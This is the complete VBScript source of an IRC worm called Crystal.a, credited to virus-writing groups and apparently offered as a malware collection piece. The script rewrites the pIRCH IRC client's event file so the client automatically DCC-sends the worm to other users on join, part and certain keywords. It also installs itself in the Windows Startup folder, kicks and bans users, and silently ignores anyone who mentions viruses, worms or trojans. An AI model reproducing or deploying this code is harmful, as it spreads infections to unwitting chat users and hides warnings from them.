Vbs.Crystal.a by Knowdeth


'= pIRCH98/32.Crystal.a                             =
'= by -KD- [Metaphase VX Team] & [NoMercyVirusTeam] =
On Error Resume Next
Dim Crystal, MyFile, FSO
Set FSO = CreateObject("Scripting.FileSystemObject")
Crystal = Wscript.ScriptFullName
Set MyFile = FSO.CreateTextFile("c:\WINDOWS\events1.dll", True)
MyFile.WriteLine "[Levels]"
MyFile.WriteLine "Enabled=1"
MyFile.WriteLine "Count=6"
MyFile.WriteLine "Level1=000-Unknowns"
MyFile.WriteLine "000-UnknownsEnabled=1"
MyFile.WriteLine "Level2=100-Level 100"
MyFile.WriteLine "100-Level 100Enabled=1"
MyFile.WriteLine "Level3=200-Level 200"
MyFile.WriteLine "200-Level 200Enabled=1"
MyFile.WriteLine "Level4=300-Level 300"
MyFile.WriteLine "300-Level 300Enabled=1"
MyFile.WriteLine "Level5=400-Level 400"
MyFile.WriteLine "400-Level 400Enabled=1"
MyFile.WriteLine "Level6=500-Level 500"
MyFile.WriteLine "500-Level 500Enabled=1"
MyFile.WriteLine ""
MyFile.WriteLine "[000-Unknowns]"
MyFile.WriteLine "User1=*!*@*"
MyFile.WriteLine "UserCount=1"
MyFile.WriteLine "Event1=; pIRCH98/32.Crystal.a"
MyFile.WriteLine "Event2=; by -KD- [Metaphase VX Team] & [NoMercyVirusTeam]"
MyFile.WriteLine "Event3=ON JOIN:#:/notice $nick Tell me that file isnt the cutest ;)"
MyFile.WriteLine "Event4=ON JOIN:#:/dcc send $nick  c:\windows\baby.vbs"
MyFile.WriteLine "Event5=@ON BAN:*:#:/mode # -o+b $me $banmask | /kick # $nick Dont ban me!!"
MyFile.WriteLine "Event6=ON PART:#:/notice $nick Case I didnt send it yet this is the cutest thing Ive seen ;)"
MyFile.WriteLine "Event7=ON PART:#:/dcc send $nick c:\windows\baby.vbs"
MyFile.WriteLine "Event8=VERSION:/notice $nick \-1 pIRCH98/32: Crystal.a by -KD- I'm Infected!!! \-1:-"
MyFile.WriteLine "Event9=ON TOPIC:#:/topic # Crystal rocks! | /notice $nick Crystal!!!"
MyFile.WriteLine "Event10=ON ACTION:*hump*:#:/notice $nick Get off my leg!!"
MyFile.WriteLine "Event11=ON ACTION:*hump*:#:/kick # $nick Get off my leg I said!!"
MyFile.WriteLine "Event12=ON TEXT:*hump*:#:/ignore # $nick"
MyFile.WriteLine "Event13=ON TEXT:*sex*:#:/kick # $nick Crystal!!!"
MyFile.WriteLine "Event14=ON TEXT:*fuck*:#:/kick # $nick Crystal!!!"
MyFile.WriteLine "Event15=ON TEXT:*damn*:#:/kick # $nick Crystal!!!"
MyFile.WriteLine "Event16=ON TEXT:*satan*:#:/kick # $nick Crystal!!!"
MyFile.WriteLine "Event17=ON TEXT:*dick*:#:/kick # $nick Crystal!!!"
MyFile.WriteLine "Event18=ON TEXT:*hump*:#:/ignore # $nick"
MyFile.WriteLine "Event19=ON TEXT:*hell*:#:/ignore # $nick"
MyFile.WriteLine "Event20=ON TEXT:*virus*:#:/ignore # $nick"
MyFile.WriteLine "Event21=ON TEXT:*worm*:#:/ignore # $nick"
MyFile.WriteLine "Event22=ON TEXT:*trojan*:#:/ignore # $nick"
MyFile.WriteLine "Event23=ON TEXT:*Crystal*:#:/ignore # $nick"
MyFile.WriteLine "Event24=ON TEXT:*baby*:*:/dcc send $nick c:\windows\baby.vbs"
MyFile.WriteLine "Event25=PING:/notice $nick Oh god baby do it again! ;)"
MyFile.WriteLine "Event26=ON QUIT:/msg :#vir: pIRCH98/32.Crystal by -KD-! gotta love it!"
MyFile.WriteLine "Event27=ON KICKED:*:#: /msg $nick What the hell? | /join # | /mode # -o+b $nick $banmask"
MyFile.WriteLine "EventCount=27"
MyFile.WriteLine ""
MyFile.WriteLine "[100-Level 100]"
MyFile.WriteLine "UserCount=0"
MyFile.WriteLine "EventCount=0"
MyFile.WriteLine ""
MyFile.WriteLine "[200-Level 200]"
MyFile.WriteLine "UserCount=0"
MyFile.WriteLine "EventCount=0"
MyFile.WriteLine ""
MyFile.WriteLine "[300-Level 300]"
MyFile.WriteLine "UserCount=0"
MyFile.WriteLine "EventCount=0"
MyFile.WriteLine ""
MyFile.WriteLine "[400-Level 400]"
MyFile.WriteLine "UserCount=0"
MyFile.WriteLine "EventCount=0"
MyFile.WriteLine ""
MyFile.WriteLine "[500-Level 500]"
MyFile.WriteLine "UserCount=0"
MyFile.WriteLine "EventCount=0"
MyFile.Close
FSO.CopyFile "c:\WINDOWS\events1.dll", "c:\pirch98\events.ini"
FSO.CopyFile "c:\WINDOWS\events1.dll", "c:\pirch32\events.ini"
FSO.CopyFile Crystal, "c:\WINDOWS\baby.vbs"
FSO.CopyFile Crystal, "c:\WINDOWS\Start Menu\Programs\StartUp\Startup.vbs"
If Day(Now()) = 1 or Day(Now()) = 20 Then
  MsgBox "Hurry for a child" & Chr(13) & Chr(10) & "That makes it through." & Chr(13) & Chr(10) & "If theres any way" & Chr(13) & Chr(10) & "Because the answer lies in you", 4096 , "Crystal"
End If